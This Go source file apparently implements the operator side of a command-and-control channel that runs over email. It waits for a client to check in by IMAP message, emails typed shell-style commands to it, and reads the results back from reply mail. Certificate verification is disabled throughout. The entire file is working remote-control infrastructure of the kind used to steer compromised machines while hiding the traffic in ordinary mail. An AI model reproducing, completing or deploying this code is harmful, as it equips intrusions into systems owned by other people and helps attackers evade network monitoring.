package main

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"net/mail"
	"strings"
	"time"

	"github.com/emersion/go-imap"
	"github.com/emersion/go-imap/client"
	"gopkg.in/gomail.v2"
)

type EmailConfig struct {
	ImapServer   string
	SmtpServer   string
	EmailAddress string
	Password     string
	ClientEmail  string
}

type Server struct {
	config     EmailConfig
	imapClient *client.Client
	activeUUID string
}

type Message struct {
	Type      string `json:"type"`      // "command" or "response"
	UUID      string `json:"uuid"`      // client UUID
	Content   string `json:"content"`   // actual command or response content
	Timestamp int64  `json:"timestamp"` // unix timestamp
}

func NewServer(config EmailConfig) *Server {
	return &Server{
		config: config,
	}
}

func (s *Server) Connect() error {
	return s.reconnect()
}

func (s *Server) reconnect() error {
	if s.imapClient != nil {
		s.imapClient.Logout()
	}

	// Create TLS config with certificate verification disabled
	tlsConfig := &tls.Config{
		InsecureSkipVerify: true,
	}

	// Connect to IMAP server
	c, err := client.DialTLS(s.config.ImapServer, tlsConfig)
	if err != nil {
		return fmt.Errorf("failed to connect to IMAP server: %v", err)
	}

	if err := c.Login(s.config.EmailAddress, s.config.Password); err != nil {
		return fmt.Errorf("failed to login to IMAP server: %v", err)
	}

	s.imapClient = c
	return nil
}

func (s *Server) ensureMailboxSelected() error {
	// First try to check connection with a NOOP
	if err := s.imapClient.Noop(); err != nil {
		log.Printf("NOOP failed, attempting reconnect: %v", err)
		if err := s.reconnect(); err != nil {
			return fmt.Errorf("failed to reconnect: %v", err)
		}
	}

	// Now try to select the mailbox
	if _, err := s.imapClient.Select("INBOX", false); err != nil {
		log.Printf("Failed to select inbox: %v", err)
		if err := s.reconnect(); err != nil {
			return fmt.Errorf("failed to reconnect: %v", err)
		}
		if _, err := s.imapClient.Select("INBOX", false); err != nil {
			return fmt.Errorf("failed to select inbox after reconnect: %v", err)
		}
	}
	return nil
}

func (s *Server) SendCommand(command string) error {
	// Clean the command string
	command = strings.TrimSpace(command)
	
	// Create message structure
	msg := Message{
		Type:      "command",
		UUID:      s.activeUUID,
		Content:   command,
		Timestamp: time.Now().Unix(),
	}

	// Convert to JSON
	jsonData, err := json.Marshal(msg)
	if err != nil {
		return fmt.Errorf("failed to marshal command: %v", err)
	}

	log.Printf("Sending command message: %s", string(jsonData))

	m := gomail.NewMessage()
	m.SetHeader("From", s.config.EmailAddress)
	m.SetHeader("To", s.config.ClientEmail)
	m.SetHeader("Subject", fmt.Sprintf("CMD:%s", s.activeUUID))
	m.SetHeader("Content-Type", "application/json")
	
	// Send raw JSON without any encoding
	m.SetBody("text/plain", string(jsonData))

	d := gomail.NewDialer(s.config.SmtpServer, 587, s.config.EmailAddress, s.config.Password)
	d.TLSConfig = &tls.Config{InsecureSkipVerify: true}
	
	if err := d.DialAndSend(m); err != nil {
		return fmt.Errorf("failed to send command: %v", err)
	}
	
	log.Printf("Command sent successfully")
	return nil
}

func (s *Server) WaitForClient() error {
	for {
		if err := s.ensureMailboxSelected(); err != nil {
			log.Printf("Error selecting mailbox: %v", err)
			time.Sleep(5 * time.Second)
			continue
		}

		criteria := imap.NewSearchCriteria()
		criteria.WithoutFlags = []string{"\\Seen"}
		criteria.Header = map[string][]string{"From": {s.config.ClientEmail}}

		uids, err := s.imapClient.Search(criteria)
		if err != nil {
			log.Printf("Search error: %v", err)
			time.Sleep(2 * time.Second)
			continue
		}

		if len(uids) > 0 {
			seqset := new(imap.SeqSet)
			seqset.AddNum(uids...)

			section := &imap.BodySectionName{}
			items := []imap.FetchItem{imap.FetchEnvelope, section.FetchItem()}

			messages := make(chan *imap.Message, 10)
			done := make(chan error, 1)

			go func() {
				done <- s.imapClient.Fetch(seqset, items, messages)
			}()

			for msg := range messages {
				if strings.HasPrefix(msg.Envelope.Subject, "INIT:") {
					clientUUID := strings.TrimPrefix(msg.Envelope.Subject, "INIT:")
					s.activeUUID = clientUUID
					log.Printf("New client connected with UUID: %s", clientUUID)

					// Mark message as seen
					seqSet := new(imap.SeqSet)
					seqSet.AddNum(msg.SeqNum)
					item := imap.FormatFlagsOp(imap.AddFlags, true)
					flags := []interface{}{imap.SeenFlag}
					if err := s.imapClient.Store(seqSet, item, flags, nil); err != nil {
						log.Printf("Failed to mark message as seen: %v", err)
					}

					return nil
				}
			}

			if err := <-done; err != nil {
				log.Printf("Fetch error: %v", err)
			}
		}

		time.Sleep(5 * time.Second)
	}
}

func (s *Server) WaitForResponse() (string, error) {
	for {
		// Ensure we're connected and mailbox is selected
		if err := s.ensureMailboxSelected(); err != nil {
			log.Printf("Failed to select mailbox: %v, retrying...", err)
			time.Sleep(2 * time.Second)
			continue
		}

		criteria := imap.NewSearchCriteria()
		criteria.WithoutFlags = []string{"\\Seen"}
		criteria.Header = map[string][]string{"From": {s.config.ClientEmail}}

		uids, err := s.imapClient.Search(criteria)
		if err != nil {
			log.Printf("Search error: %v, retrying...", err)
			time.Sleep(2 * time.Second)
			continue
		}

		if len(uids) > 0 {
			seqset := new(imap.SeqSet)
			seqset.AddNum(uids...)

			section := &imap.BodySectionName{Peek: true}
			items := []imap.FetchItem{imap.FetchEnvelope, section.FetchItem()}

			messages := make(chan *imap.Message, 10)
			done := make(chan error, 1)

			go func() {
				done <- s.imapClient.Fetch(seqset, items, messages)
			}()

			for msg := range messages {
				if strings.HasPrefix(msg.Envelope.Subject, "RESP:"+s.activeUUID) {
					r := msg.GetBody(section)
					if r == nil {
						continue
					}

					// Read the full message into memory
					var buf bytes.Buffer
					if _, err := io.Copy(&buf, r); err != nil {
						log.Printf("Failed to read message body: %v", err)
						continue
					}

					// Parse the email message
					email, err := mail.ReadMessage(&buf)
					if err != nil {
						log.Printf("Failed to parse email: %v", err)
						continue
					}

					// Read and clean the message body
					body, err := io.ReadAll(email.Body)
					if err != nil {
						log.Printf("Failed to read email body: %v", err)
						continue
					}

					// Log raw body for debugging
					log.Printf("Raw email body: %q", string(body))

					// First clean up the email encoding
					cleanBody := strings.ReplaceAll(string(body), "=\r\n", "")
					cleanBody = strings.ReplaceAll(cleanBody, "=3D", "=")
					cleanBody = strings.TrimSpace(cleanBody)

					log.Printf("Cleaned raw message: %q", cleanBody)

					// Parse JSON message
					var message Message
					if err := json.Unmarshal([]byte(cleanBody), &message); err != nil {
						log.Printf("Failed to parse JSON message: %v", err)
						continue
					}

					// Clean the response content but preserve special characters
					message.Content = strings.TrimSpace(message.Content)

					log.Printf("Received response message: %+v", message)

					// Verify message type and UUID
					if message.Type != "response" || message.UUID != s.activeUUID {
						log.Printf("Invalid message type or UUID: %+v", message)
						log.Printf("Expected UUID: %s, Got UUID: %s", s.activeUUID, message.UUID)
						continue
					}

					// Mark message as seen
					seqSet := new(imap.SeqSet)
					seqSet.AddNum(msg.SeqNum)
					item := imap.FormatFlagsOp(imap.AddFlags, true)
					flags := []interface{}{imap.SeenFlag}
					if err := s.imapClient.Store(seqSet, item, flags, nil); err != nil {
						log.Printf("Failed to mark message as seen: %v", err)
					}

					return message.Content, nil
				}
			}

			if err := <-done; err != nil {
				log.Printf("Fetch error: %v", err)
			}
		}

		time.Sleep(2 * time.Second)
	}
}

func main() {
	var config EmailConfig

	// Parse command line arguments
	flag.StringVar(&config.ImapServer, "imap", "", "IMAP server address (e.g., imap.gmail.com:993)")
	flag.StringVar(&config.SmtpServer, "smtp", "", "SMTP server address (e.g., smtp.gmail.com)")
	flag.StringVar(&config.EmailAddress, "email", "", "Email address to send from")
	flag.StringVar(&config.ClientEmail, "client", "", "Client's email address")
	flag.StringVar(&config.Password, "password", "", "Email password or app-specific password")
	flag.Parse()

	// Validate required flags
	if config.ImapServer == "" || config.SmtpServer == "" || 
	   config.EmailAddress == "" || config.Password == "" || 
	   config.ClientEmail == "" {
		log.Fatal("All flags are required: -imap, -smtp, -email, -client, -password")
	}

	server := NewServer(config)
	if err := server.Connect(); err != nil {
		log.Fatalf("Failed to connect: %v", err)
	}
	defer server.imapClient.Logout()

	log.Println("Waiting for client...")
	if err := server.WaitForClient(); err != nil {
		log.Fatalf("Error waiting for client: %v", err)
	}

	for {
		var command string
		fmt.Print("Enter command: ")
		fmt.Scanln(&command)

		if err := server.SendCommand(command); err != nil {
			log.Printf("Error sending command: %v", err)
			continue
		}

		response, err := server.WaitForResponse()
		if err != nil {
			log.Printf("Error getting response: %v", err)
			continue
		}

		fmt.Printf("Response:\n%s\n", response)
	}
}
